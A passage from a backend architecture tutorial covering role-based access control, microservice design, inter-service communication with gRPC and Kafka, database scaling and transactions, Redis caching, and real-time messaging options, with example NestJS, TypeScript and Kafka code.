4. If invalid → Return 401 with message "Invalid MFA code"
5. If valid → Proceed with session creation
```

### 7.6 Role-Based Access Control (RBAC)

For enterprise systems, you need fine-grained permissions:

```
RBAC MODEL:

Roles:
  - super_admin: Can do anything
  - admin: Can manage users, view reports
  - moderator: Can review and remove content
  - premium_user: Can access premium features
  - user: Standard user capabilities
  - readonly: Can only view, not create or modify

Permissions:
  - users:read     - users:write    - users:delete
  - posts:read     - posts:write    - posts:delete
  - payments:read  - payments:write
  - admin:access

Role → Permission mapping:
  user:         [posts:read, posts:write, users:read (own profile only)]
  moderator:    [posts:read, posts:write, posts:delete, users:read]
  admin:        [all of moderator + users:write, users:delete, admin:access]
  super_admin:  [all permissions]

Implementation in NestJS:

@Injectable()
export class RolesGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.get<string[]>('roles', context.getHandler());
    if (!requiredRoles) return true; // No roles required → public route

    const request = context.switchToHttp().getRequest();
    const user = request.user; // Set by JWT guard earlier in pipeline

    return requiredRoles.some(role => user.roles.includes(role));
  }
}

// Usage:
@Controller('admin')
@UseGuards(JwtAuthGuard, RolesGuard)
export class AdminController {
  @Get('users')
  @Roles('admin', 'super_admin')
  getAllUsers() { ... }
  
  @Delete('users/:id')
  @Roles('super_admin')
  deleteUser(@Param('id') id: string) { ... }
}
```

---

## 8. Layer 5: Microservices Architecture

### 8.1 Designing Service Boundaries (Domain-Driven Design)

The hardest part of microservices is deciding "where does one service end and another begin?" The answer comes from **Domain-Driven Design (DDD)**.

In DDD, you identify **Bounded Contexts** — areas of the business that are naturally separate with their own language, rules, and data:

```
Facebook's Bounded Contexts:

Identity & Access Context:
  - Users, Authentication, Authorization, Account Settings
  - "User" here means: { id, email, passwordHash, roles, mfaSecret }

Social Graph Context:
  - Friendships, Follows, Blocks, Friend Suggestions
  - "User" here means: { id, name, mutualFriends, followersCount }

News Feed Context:
  - Posts, Comments, Likes, Shares, Feed Algorithm
  - "User" here means: { id, name, profilePicUrl }

Messaging Context:
  - Conversations, Messages, Read Receipts, Reactions
  - "User" here means: { id, name, onlineStatus, lastSeen }

Marketplace Context:
  - Listings, Orders, Payments, Sellers
  - "User" here means: { id, name, sellerRating, paymentInfo }
```

Notice: The word "User" means something different in each context. This is why each context has its own database — they store what they need about a user for their specific purpose.

### 8.2 The Complete Service Directory

For a Facebook-scale application, here is the full service catalog:

```
CORE SERVICES:

1. Identity Service (NestJS + PostgreSQL)
   Responsibilities: Register, login, token management, MFA, password reset
   API: POST /auth/register, POST /auth/login, POST /auth/refresh, POST /auth/logout

2. User Profile Service (NestJS + PostgreSQL)
   Responsibilities: Profile data, settings, privacy controls, account management
   API: GET /users/:id, PUT /users/:id, DELETE /users/:id

3. Social Graph Service (Go + Neo4j or PostgreSQL with recursive queries)
   Responsibilities: Friendships, follows, blocks, friend suggestions
   API: POST /friendships, GET /friends/:userId, DELETE /friendships/:id

4. News Feed Service (Go + Redis + Cassandra)
   Responsibilities: Generating and serving personalized feeds, ranking content
   API: GET /feed (personalized), POST /posts, GET /posts/:id

5. Notification Service (Node.js + Kafka + Socket.IO + PostgreSQL)
   Responsibilities: Push notifications, email notifications, in-app notifications
   API: WebSocket connection, GET /notifications, PUT /notifications/:id/read

6. Chat/Messaging Service (Go or Erlang + Cassandra)
   Responsibilities: Direct messages, group chats, message delivery, read receipts
   API: WebSocket connection, GET /conversations, GET /messages/:conversationId

7. Media Service (Python + FFmpeg + S3)
   Responsibilities: Image/video upload, transcoding, CDN management
   API: POST /media/upload, GET /media/:id

8. Search Service (Java + Elasticsearch)
   Responsibilities: Full-text search across users, posts, pages, groups
   API: GET /search?q=term&type=users,posts

9. Recommendation Service (Python + TensorFlow/PyTorch + Redis)
   Responsibilities: People you may know, content recommendations, ad targeting
   API: GET /recommendations/people, GET /recommendations/content

10. Advertising Service (Java + PostgreSQL + Redis)
    Responsibilities: Ad creation, targeting, serving, billing, reporting
    API: POST /ads, GET /ads/serve, GET /ads/reports

11. Payment Service (Java/Kotlin + PostgreSQL + Stripe)
    Responsibilities: Marketplace payments, subscriptions, refunds
    API: POST /payments, POST /refunds, GET /payment-methods

12. Analytics Service (Python + ClickHouse/BigQuery)
    Responsibilities: Event tracking, business intelligence, A/B test metrics
    API: POST /events (fire and forget)

PLATFORM SERVICES (Infrastructure):

13. API Gateway Service (Kong)
    Routes, auth, rate limiting for all services

14. Service Discovery (Consul or Kubernetes DNS)
    Services find each other by name, not IP address

15. Configuration Service (HashiCorp Vault or AWS Secrets Manager)
    Centralized storage of all secrets, API keys, database passwords

16. Job Queue Service (Bull + Redis)
    Background job processing: sending emails, generating reports, etc.

17. Email Service (Node.js + AWS SES)
    Templated email sending triggered by events

18. A/B Testing Service (Go + Redis)
    Feature flags and experiment assignment

19. Rate Limiting Service (Redis-based)
    Centralized rate limit state for all services

20. Audit Log Service (Go + Elasticsearch)
    Immutable log of all sensitive operations for compliance
```

### 8.3 Service Template — The Standard Structure

Every microservice in a mature organization follows the same internal structure so any developer can jump into any service and immediately understand it:

```
user-service/
├── src/
│   ├── main.ts                    # App bootstrap
│   ├── app.module.ts              # Root module
│   │
│   ├── config/                    # Configuration management
│   │   ├── database.config.ts
│   │   └── kafka.config.ts
│   │
│   ├── user/                      # Feature module
│   │   ├── user.module.ts
│   │   ├── user.controller.ts     # HTTP handlers — THIN, just calls service
│   │   ├── user.service.ts        # Business logic — all complex code here
│   │   ├── user.repository.ts     # Database access — abstracts Prisma/TypeORM
│   │   ├── user.dto.ts            # Data Transfer Objects — validate input shapes
│   │   ├── user.entity.ts         # Database model
│   │   └── user.spec.ts           # Unit tests
│   │
│   ├── auth/                      # Authentication guards
│   │   ├── firebase-auth.guard.ts
│   │   └── roles.guard.ts
│   │
│   ├── common/                    # Shared utilities
│   │   ├── filters/               # Global exception handlers
│   │   ├── interceptors/          # Logging, transformation
│   │   └── pipes/                 # Input validation
│   │
│   └── health/                    # Health check endpoint
│       └── health.controller.ts
│
├── prisma/
│   ├── schema.prisma              # Database schema
│   └── migrations/                # Database migration files
│
├── test/
│   ├── user.e2e-spec.ts          # End-to-end tests
│   └── jest-e2e.json
│
├── Dockerfile
├── .env.example
├── package.json
└── README.md
```

---

## 9. Layer 6: Inter-Service Communication

This is the most technically complex aspect of microservices. When services need to talk to each other, you have two fundamental patterns:

### 9.1 Synchronous Communication (REST and gRPC)

Synchronous means: Service A calls Service B and **waits** for the response before continuing.

```
WHEN TO USE SYNCHRONOUS COMMUNICATION:
  ✅ The caller NEEDS the response to continue
  ✅ The operation is fast (< 100ms expected)
  ✅ User is waiting for the result
  
  Example: User submits a login form
    → Auth Service needs User Service to get the password hash
    → Auth Service cannot proceed without the response
    → Synchronous call makes sense

WHEN NOT TO USE SYNCHRONOUS COMMUNICATION:
  ❌ The operation is slow (email sending, video transcoding)
  ❌ The caller doesn't need the result (logging, analytics)
  ❌ The downstream service might be unavailable (creates cascade failures)
```

**REST (HTTP) for Synchronous Calls:**
```
Service A calls Service B via HTTP:

fetch('http://user-service:3000/users/' + userId, {
  headers: {
    'X-Internal-Service': 'auth-service',
    'X-Correlation-Id': correlationId  // For distributed tracing
  }
})
```

**gRPC for High-Performance Synchronous Calls:**

gRPC is a binary protocol that is ~7x faster than REST. It is used for high-frequency internal service calls:

```protobuf
// shared-protos/user.proto

syntax = "proto3";
package user;

service UserService {
  rpc GetUser (GetUserRequest) returns (UserResponse);
  rpc UpdateUser (UpdateUserRequest) returns (UserResponse);
}

message GetUserRequest {
  string user_id = 1;
}

message UserResponse {
  string id = 1;
  string email = 2;
  string name = 3;
  repeated string roles = 4;
}
```

```typescript
// auth-service: calling user-service via gRPC
@Injectable()
export class AuthService {
  constructor(
    @Inject('USER_PACKAGE')
    private readonly userClient: ClientGrpc
  ) {}

  private userService: UserServiceClient;

  onModuleInit() {
    this.userService = this.userClient.getService<UserServiceClient>('UserService');
  }

  async validateUser(userId: string): Promise<User> {
    // gRPC call: binary protocol, much faster than HTTP/JSON
    const user = await lastValueFrom(
      this.userService.getUser({ userId })
    );
    return user;
  }
}
```

### 9.2 Asynchronous Communication (Event-Driven with Kafka)

Asynchronous means: Service A sends a message to a queue and **does not wait**. Service B picks it up whenever it is ready.

```
WHEN TO USE ASYNCHRONOUS COMMUNICATION:
  ✅ The caller doesn't need the result immediately
  ✅ The operation is slow
  ✅ Multiple services need to react to the same event
  ✅ You want resilience (if Service B crashes, messages are saved in Kafka)
  
  Example: User creates a new post
    → Feed Service updates timelines (slow — might need to update 1 million followers)
    → Notification Service sends push notifications
    → Analytics Service records the event
    → Content Moderation Service scans for policy violations
    → User does NOT need to wait for all of these before seeing "Post published!"
```

### 9.3 The Service Mesh

In a system with 500 microservices, managing the network connections between them becomes a massive operational problem:

- How does Service A find the current IP address of Service B?
- If Service B is slow, how does Service A implement a timeout?
- How do you trace a request through 15 different services?
- How do you encrypt all inter-service communication?
- How do you set traffic policies between services?

The solution is a **Service Mesh** (Istio or Linkerd):

```
WITHOUT SERVICE MESH:
  Each service must implement:
    - Service discovery (how to find other services)
    - Circuit breaking (stop calling a failing service)
    - Retry logic
    - Timeouts
    - mTLS encryption
    - Distributed tracing propagation
  
  This is thousands of lines of duplicated infrastructure code per service.

WITH ISTIO SERVICE MESH:
  A sidecar proxy (Envoy) runs NEXT TO every service container
  Envoy handles ALL of the above automatically
  
  ┌──────────────────────────────────────┐
  │ User Service Container               │
  │                                      │
  │  [User Service App]  [Envoy Proxy]  │
  │       Port 3000      Port 15001     │
  └──────────────────────────────────────┘
  
  ALL traffic in/out goes through Envoy
  Envoy handles:
    - Service discovery (uses Kubernetes DNS)
    - Load balancing
    - Circuit breaking
    - Automatic mTLS (all internal traffic encrypted)
    - Automatic request tracing headers
    - Metrics collection
  
  Your service code doesn't need to know any of this exists.
```

### 9.4 Circuit Breaker Pattern

When a service is failing, you should stop calling it immediately to prevent cascade failures:

```
SCENARIO: Payment Service is down

WITHOUT CIRCUIT BREAKER:
  Order Service → calls Payment Service → 30 second timeout → error
  10,000 requests queued up, all waiting 30 seconds
  → Order Service thread pool exhausted
  → Order Service itself becomes unresponsive
  → API Gateway can't reach Order Service
  → Entire application appears down
  ALL BECAUSE OF ONE FAILING SERVICE

WITH CIRCUIT BREAKER:
  
  CLOSED state (normal):
    Calls pass through. Failure rate monitored.
    
  If failure rate > 50% in last 10 seconds:
    → Circuit OPENS
  
  OPEN state (service is failing):
    Calls immediately FAIL with "Service unavailable" (no waiting)
    → Order Service responds: "Payment temporarily unavailable, try again later"
    → No thread pool exhaustion
    → Rest of app is fine
    Wait 30 seconds, then try ONE test request (HALF-OPEN state)
    
  HALF-OPEN state:
    Let ONE request through
    If it succeeds → Circuit CLOSES (back to normal)
    If it fails → Circuit stays OPEN for another 30 seconds

Implementation with Resilience4j (Java) or opossum (Node.js):

const CircuitBreaker = require('opossum');

const options = {
  timeout: 3000,            // If function takes longer than 3 seconds, trigger failure
  errorThresholdPercentage: 50,  // Open circuit when 50% of requests fail
  resetTimeout: 30000        // After 30 seconds, try again (half-open)
};

const breaker = new CircuitBreaker(callPaymentService, options);

breaker.fallback(() => ({ status: 'error', message: 'Payment service temporarily unavailable' }));

breaker.fire(orderId, amount)
  .then(result => console.log(result))
  .catch(console.error);
```

---

## 10. Layer 7: The Database Layer

### 10.1 The Polyglot Persistence Principle

Enterprise applications never use ONE database for everything. Different data has different shapes, access patterns, and consistency requirements. Using the wrong database for the wrong data is one of the most expensive architectural mistakes you can make.

```
THE RIGHT DATABASE FOR THE RIGHT JOB:

┌─────────────────────────────────────────────────────────────────────────┐
│  RELATIONAL (PostgreSQL / MySQL)                                        │
│  Use when: Data has strict relationships, ACID compliance required      │
│  Examples: User accounts, financial transactions, orders, subscriptions │
│  Why: Transactions guarantee: money never disappears between tables     │
│  Scale: Up to ~10M rows before needing special techniques               │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  DOCUMENT (MongoDB)                                                     │
│  Use when: Data schema varies, nested/hierarchical data                 │
│  Examples: User posts, product catalogs, activity logs, CMS content     │
│  Why: A Facebook post can have text, photos, polls, live video          │
│       A fixed relational schema can't model all these as one entity     │
│  Scale: Can handle billions of documents horizontally                   │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  WIDE-COLUMN (Cassandra / DynamoDB)                                     │
│  Use when: Massive write throughput, time-series data                   │
│  Examples: Chat messages, activity feeds, sensor data, analytics events │
│  Why: Designed to write millions of records per second                  │
│       Facebook uses Cassandra for Messenger (billions of messages/day)  │
│  Scale: Horizontally to petabytes                                       │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  IN-MEMORY (Redis)                                                      │
│  Use when: Speed is critical, data can be lost on restart               │
│  Examples: Sessions, caching, rate limiting counters, leaderboards      │
│  Why: Reads and writes in microseconds (vs milliseconds for disk DBs)   │
│  Scale: Vertically (bigger RAM) or Redis Cluster (horizontal)           │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  SEARCH ENGINE (Elasticsearch)                                          │
│  Use when: Full-text search, fuzzy matching, aggregations               │
│  Examples: Job search, user search, content search, log analysis        │
│  Why: PostgreSQL LIKE query: 30 seconds on 100M rows                   │
│       Elasticsearch: 50ms on 100M records with typo tolerance           │
│  Scale: Horizontally, cluster of nodes                                  │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  GRAPH DATABASE (Neo4j)                                                 │
│  Use when: Data is fundamentally about relationships                    │
│  Examples: Social networks, recommendation engines, fraud detection     │
│  Why: "Find friends of friends who also like hiking" is 1 Cypher query │
│       In PostgreSQL, this requires complex recursive JOINs              │
│  Scale: Difficult to scale horizontally (specialized use case)          │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  OBJECT STORAGE (AWS S3 / Cloudflare R2)                               │
│  Use when: Storing large binary files                                   │
│  Examples: Profile photos, videos, PDFs, audio files, backups           │
│  Why: Not a "database" in the traditional sense — it's a file system   │
│       for the internet. Infinitely scalable, pays per GB stored         │
│  Scale: Infinite (Amazon manages the hardware)                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 10.2 Database Scaling Techniques

When a single database instance can no longer handle the load, here are the scaling strategies in order of complexity:

**Strategy 1: Vertical Scaling (Buy a Bigger Server)**
```
Current: 8 cores, 32GB RAM
Upgrade to: 64 cores, 512GB RAM

Pros: Easy, no code changes
Cons: Expensive, has a ceiling, brief downtime during upgrade
When to use: First line of defense when performance degrades
```

**Strategy 2: Read Replicas**
```
Observation: In most applications, 80-90% of database operations are READS
(fetching posts, loading profiles) and only 10-20% are WRITES (creating posts).

Solution: One PRIMARY database handles all WRITES
          Multiple REPLICA databases handle all READS
          Primary continuously replicates (copies) data to replicas

┌──────────────────┐    Replicate    ┌──────────────────┐
│   PRIMARY DB     │ ─────────────→  │   REPLICA 1      │
│  (Writes only)   │                 │   (Reads only)   │
└──────────────────┘                 └──────────────────┘
                                     ┌──────────────────┐
                         Replicate→  │   REPLICA 2      │
                                     │   (Reads only)   │
                                     └──────────────────┘

// In your app code:
class UserRepository {
  constructor(
    @InjectRepository(User) private readonly writeRepo: Repository<User>,  // Primary
    @InjectReadRepository(User) private readonly readRepo: Repository<User> // Replica
  ) {}

  async createUser(data: CreateUserDto) {
    return this.writeRepo.save(data);  // Always write to primary
  }

  async findUser(id: string) {
    return this.readRepo.findOne({ where: { id } });  // Read from replica
  }
}

Pros: Linear read scaling, zero code complexity
Cons: Replication lag (replica might be 100ms behind primary — eventual consistency)
When to use: When read load is the bottleneck
```

**Strategy 3: Database Sharding (Horizontal Partitioning)**
```
When even replicas can't handle the write volume, you shard.
Sharding splits the data across multiple databases.

Example: User data sharded by user_id range

Shard 1: Users with ID 0 - 250,000,000
Shard 2: Users with ID 250,000,001 - 500,000,000
Shard 3: Users with ID 500,000,001 - 750,000,000
Shard 4: Users with ID 750,000,001 - 1,000,000,000

// Finding which shard a user is on:
function getShard(userId: number): string {
  const shardIndex = Math.floor(userId / 250_000_000);
  return `shard-${shardIndex + 1}`;
}

// In repository:
async findUser(userId: number) {
  const shard = getShard(userId);
  const db = this.shardConnections[shard];
  return db.query('SELECT * FROM users WHERE id = ?', [userId]);
}

Problems with sharding:
  - Cross-shard queries become expensive ("Find all users who logged in today" now queries 4 shards)
  - Rebalancing shards when data grows is extremely complex
  - Transactions across shards are nearly impossible
  
When to use: Last resort. Most companies never need to shard.
```

### 10.3 Database Transactions and ACID

For financial data and anything that requires "all or nothing" behavior:

```
ACID PROPERTIES:

Atomicity: All steps in a transaction succeed, or NONE do.
  Example: Transferring $100:
    Step 1: Deduct $100 from Account A
    Step 2: Add $100 to Account B
    If Step 2 fails, Step 1 is ROLLED BACK
    Money never disappears from Account A without appearing in Account B

Consistency: The database moves from one valid state to another valid state.
  Example: A bank account balance can never go below 0
  If a transaction would violate this, it fails entirely

Isolation: Concurrent transactions don't interfere with each other.
  Without isolation: Two people withdraw $100 from same $100 account simultaneously
  → Both reads see $100 balance → both succeed → account ends up at -$100
  With isolation: One waits for the other to finish → one gets $100, one gets "Insufficient funds"

Durability: Once a transaction commits, it survives crashes.
  Database writes to disk with fsync before confirming success
  Even if server crashes immediately after, the data is safe

// TypeORM transaction example:
async transferMoney(fromId: string, toId: string, amount: number) {
  return this.dataSource.transaction(async (manager) => {
    // All queries in this function use the same transaction
    const fromAccount = await manager.findOneOrFail(Account, { where: { id: fromId }, lock: { mode: 'pessimistic_write' } });
    
    if (fromAccount.balance < amount) {
      throw new BadRequestException('Insufficient funds');
    }
    
    fromAccount.balance -= amount;
    await manager.save(fromAccount);
    
    const toAccount = await manager.findOneOrFail(Account, { where: { id: toId } });
    toAccount.balance += amount;
    await manager.save(toAccount);
    
    // If ANY line above throws, the ENTIRE transaction is rolled back
    // fromAccount.balance and toAccount.balance are restored to original values
  });
}
```

### 10.4 Database Migration Strategy

When your app evolves, you need to change the database schema. Doing this in production without downtime requires careful strategy:

```
MIGRATION BEST PRACTICES:

Rule 1: Never make breaking changes in a single deployment
  ❌ BAD: Rename column "username" to "display_name" in one deployment
         → The running app still reads "username" → crashes immediately

  ✅ GOOD: Three-step deployment:
    Deployment 1: Add NEW column "display_name", keep "username"
                  New code writes to BOTH columns, reads from "username"
    
    Deployment 2: Run backfill script to populate "display_name" from "username"
                  New code reads from "display_name", writes to both
    
    Deployment 3: Remove old "username" column
                  New code only uses "display_name"

Rule 2: Migrations are versioned and committed to Git
  prisma/migrations/
  ├── 20241025_001_create_users_table.sql
  ├── 20241026_001_add_profile_table.sql
  ├── 20241027_001_add_display_name_column.sql
  └── 20241028_001_remove_username_column.sql

Rule 3: Migrations run automatically in CI/CD before app deployment
  # In CI/CD pipeline:
  npx prisma migrate deploy  # Applies all pending migrations
  # Then deploy the new app version
```

---

## 11. Layer 8: Caching Strategy

Caching is the single highest-impact performance optimization available. It can reduce database load by 95% and cut response times from 200ms to 1ms.

### 11.1 The Caching Hierarchy

```
REQUEST ARRIVES:

1. Browser Cache (0ms response)
   Is the data in the browser's cache? Not expired?
   → YES: Return immediately. No network request at all.
   → NO: Continue to #2

2. CDN Cache (5-10ms response)
   Is the data on a nearby CDN edge server?
   → YES: Return immediately. No request to your servers.
   → NO: Continue to #3

3. API Gateway Cache (10-20ms response)
   Is the response cached at the gateway level? (For public, identical responses)
   → YES: Return immediately. No request to microservices.
   → NO: Continue to #4

4. Application Cache / Redis (10-30ms response)
   Is the result cached in Redis?
   → YES: Return immediately. No database query.
   → NO: Continue to #5

5. Database Query (50-500ms response)
   Actually query the database.
   Store result in Redis with expiry time.
   Return result.
```

### 11.2 Redis Caching Patterns

**Pattern 1: Cache-Aside (Most Common)**
```typescript
async getUserProfile(userId: string): Promise<UserProfile> {
  const cacheKey = `user:profile:${userId}`;
  
  // 1. Try cache first
  const cached = await this.redis.get(cacheKey);
  if (cached) {
    return JSON.parse(cached);  // Cache HIT: return in 1ms
  }
  
  // 2. Cache miss: query database
  const profile = await this.userRepository.findById(userId);
  if (!profile) throw new NotFoundException('User not found');
  
  // 3. Store in cache for 1 hour
  await this.redis.set(cacheKey, JSON.stringify(profile), 'EX', 3600);
  
  return profile;  // Cache MISS: took 50ms but next call will be 1ms
}

// When profile is updated, invalidate the cache:
async updateUserProfile(userId: string, data: UpdateProfileDto) {
  await this.userRepository.update(userId, data);
  
  // Delete cache entry — next read will go to database and re-cache fresh data
  await this.redis.del(`user:profile:${userId}`);
}
```

**Pattern 2: Write-Through (For Write-Heavy Scenarios)**
```typescript
async updateUserProfile(userId: string, data: UpdateProfileDto) {
  // Write to database AND cache simultaneously
  const updated = await this.userRepository.update(userId, data);
  await this.redis.set(`user:profile:${userId}`, JSON.stringify(updated), 'EX', 3600);
  return updated;
  // Next read will find it in cache immediately — no cache miss after writes
}
```

**Pattern 3: Cache-Stampede Prevention**
```
PROBLEM: Your Redis cache expires at 3am. 10,000 users are using the app.
All 10,000 requests simultaneously hit Redis → Cache MISS
All 10,000 requests simultaneously hit the database → Database CRASHES

SOLUTION 1: Probabilistic Early Expiration
  Before the cache expires, with some probability, proactively refresh it
  So most requests still get cached data, one request refreshes before expiry

SOLUTION 2: Mutex/Locking
  When cache misses, acquire a Redis lock
  Only ONE request can refresh the cache at a time
  Others wait or return a slightly stale value

SOLUTION 3: Background Refresh
  Cache never actually expires — it just gets marked as "stale"
  Every request returns the stale data immediately
  Background job refreshes the cache asynchronously
```

### 11.3 Redis Beyond Caching

Redis is much more than a cache:

```
REDIS USE CASES:

1. Sessions:
   - Store user session data: { userId, roles, preferences }
   - Key: session:SESSION_ID
   - TTL: 30 days (auto-expire after inactivity)

2. Rate Limiting:
   - Sliding window counter per user/IP
   - Key: ratelimit:USER_ID:MINUTE_BUCKET
   - Atomic increment + TTL ensures thread-safe counting

3. Distributed Locks:
   - Prevent two servers from running the same cron job simultaneously
   - SET lock:daily-email-job UNIQUE_VALUE EX 3600 NX
   - NX = "only set if Not eXists" — atomic, race-condition safe

4. Pub/Sub:
   - Real-time events between services
   - Chat service publishes "new message" events
   - Notification service subscribes and sends push notifications

5. Leaderboards:
   - Redis Sorted Sets are perfect for rankings
   - ZADD leaderboard 9500 "player:123"
   - ZRANGEBYSCORE leaderboard 0 +inf WITHSCORES LIMIT 0 10
   - Returns top 10 players in O(log N) time

6. Queue:
   - Simple task queues using Redis Lists
   - LPUSH email-queue "{ to: 'user@example.com', template: 'welcome' }"
   - Worker: BRPOP email-queue 0 (blocking pop — worker sleeps until job arrives)
```

---

## 12. Layer 9: Asynchronous Messaging (Kafka)

### 12.1 What is Apache Kafka?

Kafka is a **distributed event streaming platform**. Think of it as a permanent, ordered log of events that any number of producers can write to and any number of consumers can read from, at any speed.

```
KAFKA CORE CONCEPTS:

Event/Message: A piece of data — "User 123 created a post with ID 456"
Topic: A named category for events — "user.posts.created"
Partition: Topics are split into partitions for parallelism
           Topic "user.posts.created" might have 100 partitions
Offset: The position of a message within a partition (like an index)
Producer: A service that publishes events to a topic
Consumer: A service that reads events from a topic
Consumer Group: Multiple consumers sharing the work of reading a topic
Broker: A Kafka server
Cluster: Multiple Kafka brokers working together
```

### 12.2 Kafka Architecture Diagram

```
PRODUCERS:                          KAFKA CLUSTER:
                                    
User Service    ─────────────────→  Topic: user.posts.created
  "Post created"                    ┌─────────────────────────┐
                                    │ Partition 0:            │
Feed Service    ─────────────────→  │ [msg0][msg1][msg3]...   │
  "Feed updated"                    │                         │
                                    │ Partition 1:            │
Scraper Service ─────────────────→  │ [msg2][msg4][msg7]...   │
  "Job found"                       │                         │
                                    │ Partition 2:            │
                                    │ [msg5][msg6][msg8]...   │
                                    └─────────────────────────┘
                                              │
                                    ┌─────────┴─────────┐
CONSUMERS:                          │                   │

Notification Service ←──────────────┘           Analytics Service ←──
  (Consumer Group A)                             (Consumer Group B)
  Reads at its own speed                         Reads at its own speed
  Remembers offset: up to msg 45                 Remembers offset: up to msg 12
  (Notification might be slow)                   (Analytics is even slower)
```

**KEY INSIGHT:** Different consumer groups maintain their own offset (position). The notification service can be at message 45 while the analytics service is at message 12. They don't interfere. If the analytics service crashes and restarts, it picks up exactly from message 12. Messages are not lost.

### 12.3 Message Retention — Kafka vs Traditional Queues

```
TRADITIONAL QUEUE (RabbitMQ):
  Message published → Consumer reads it → MESSAGE IS DELETED
  If consumer was offline → Message is lost (or held briefly then dead-lettered)
  One message, one consumer

KAFKA:
  Message published → Stored on disk for configurable period (default: 7 days)
  MULTIPLE consumer groups can all read the same message
  Messages are NEVER deleted on consumption — they expire by time
  Consumer can "replay" history by resetting its offset to 0
  
  This is incredibly powerful:
  - New service added 6 months after launch can read ALL historical events
  - Bug found in consumer logic → Fix the bug → Replay from beginning to reprocess all events
```

### 12.4 Kafka in This Repository — The Complete Job Pipeline

```
Step 1: Go Scraper finds a job listing
          ↓
          Publishes to Kafka topic "jobs.new":
          {
            "title": "Senior Software Engineer",
            "company": "TechCorp",
            "url": "https://linkedin.com/jobs/view/123456",
            "raw_description": "We are looking for...",
            "scraped_at": "2024-10-25T10:30:00Z"
          }
          ↓
Step 2: Kafka stores the message in "jobs.new" topic

Step 3a: Ingestion Service (Consumer Group "mongo-ingestion-group")
          Reads from "jobs.new"
          → Upserts job into MongoDB
          → Indexes job into Elasticsearch (dual-write)
          → Marks offset as committed

Step 3b: Notification Service (Consumer Group "email-notification-group")
          Reads from "jobs.new"  ← SAME messages, DIFFERENT consumer group
          → Finds users whose skills match this job
          → Sends email notifications
          → Emits Socket.IO event to admin dashboard
          → Marks offset as committed

Both Step 3a and 3b happen SIMULTANEOUSLY and INDEPENDENTLY.
```

### 12.5 Kafka Producer Best Practices

```typescript
// service-scraper (Go), calling Kafka from Node.js equivalent:

const { Kafka, CompressionTypes, Partitioners } = require('kafkajs');

const kafka = new Kafka({
  clientId: 'scraper-service',
  brokers: ['kafka:9092'],
  retry: {
    initialRetryTime: 300,    // Wait 300ms before first retry
    retries: 10               // Retry up to 10 times
  }
});

const producer = kafka.producer({
  createPartitioner: Partitioners.LegacyPartitioner,
  idempotent: true,           // Prevent duplicate messages even if retried
  maxInFlightRequests: 1,     // Required for idempotency
});

await producer.send({
  topic: 'jobs.new',
  compression: CompressionTypes.GZIP,  // Compress messages to save network bandwidth
  messages: [
    {
      key: jobData.url,         // Partition key: same URL always goes to same partition
                                // This ensures ordering for updates to the same job
      value: JSON.stringify(jobData),
      headers: {
        'source': 'scraper-service',
        'schema-version': '2.0',
        'correlation-id': correlationId
      }
    }
  ],
});
```

### 12.6 Kafka Consumer Best Practices

```typescript
const consumer = kafka.consumer({ 
  groupId: 'mongo-ingestion-group',
  sessionTimeout: 30000,   // Consumer considered dead if no heartbeat for 30s
  heartbeatInterval: 3000  // Send heartbeat every 3 seconds
});

await consumer.run({
  autoCommit: false,  // DON'T commit offset automatically
                      // Only commit after successful processing
                      // Automatic commit might commit before processing finishes → data loss
  
  eachMessage: async ({ topic, partition, message, heartbeat, commitOffset }) => {
    try {
      const jobData = JSON.parse(message.value.toString());
      
      // Process the message
      await jobsCollection.updateOne(
        { url: jobData.url },
        { $set: { ...jobData } },
        { upsert: true }
      );
      
      // Only commit offset AFTER successful processing
      // If processing fails, offset is NOT committed → Kafka will re-deliver this message
      await commitOffset({ topic, partition, offset: (Number(message.offset) + 1).toString() });
      
    } catch (error) {
      console.error('Failed to process message:', error);
      // Don't commit offset → Kafka will re-deliver this message
      // Consider: after N retries, send to Dead Letter Topic for manual inspection
      
      if (isRetryExhausted(error)) {
        await sendToDeadLetterTopic(message);
        await commitOffset(/* commit to move past this broken message */);
      }
    }
  }
});
```

---

## 13. Layer 10: Real-Time Communication

### 13.1 WebSockets vs Polling vs Server-Sent Events

```
OPTION 1: Polling (Naive approach)
  Client asks server every N seconds: "Any new messages?"
  
  setInterval(() => {
    fetch('/api/messages/new').then(response => updateUI(response));
  }, 2000);
  
  Pros: Simple to implement
  Cons: Most requests return empty ("no, nothing new")
        Huge waste of bandwidth and server resources
        Not truly real-time (2 second delay maximum)
  
  Appropriate for: Simple use cases, notifications that can be delayed

OPTION 2: Long Polling
  Client sends request, server HOLDS the connection open until data arrives
  
  // Client:
  async function longPoll() {
    const response = await fetch('/api/messages/poll');
    updateUI(response.data);
    longPoll();  // Immediately poll again
  }
  
  // Server: Don't respond until a new message arrives (or timeout after 30s)
  
  Pros: More real-time than polling, simple HTTP
  Cons: Still a lot of connection overhead, complex server-side logic

OPTION 3: Server-Sent Events (SSE)
  Server pushes events to client over a one-way HTTP stream
  
  // Server:
  app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    
    const interval = setInterval(() => {
      res.write(`data: ${JSON.stringify(newData)}\n\n`);
    }, 1000);
    
    req.on('close', () => clearInterval(interval));
  });
  
  // Client:
  const eventSource = new EventSource('/api/events');
  eventSource.onmessage = (event) => updateUI(JSON.parse(event.data));
  
  Pros: Simple, auto-reconnects, works with HTTP/2
  Cons: One-directional (server → client only). Client can't send events.
  
  Use for: Live sports scores, stock prices, notification feeds

OPTION 4: WebSockets (Bi-directional real-time)
  Persistent two-way connection between client and server
  
  // Client:
  const socket = new WebSocket('wss://api.yourapp.com/chat');
  socket.onmessage = (event) => displayMessage(JSON.parse(event.data));
  socket.send(JSON.stringify({ type: 'message', content: 'Hello!' }));
  
  // Server (Socket.IO):
  io.on('connection', (socket) => {
    socket.join(`room:${userId}`);  // Join a "room" for this user
    
    socket.on('message', async (data) => {
      await saveMessageToDatabase(data);
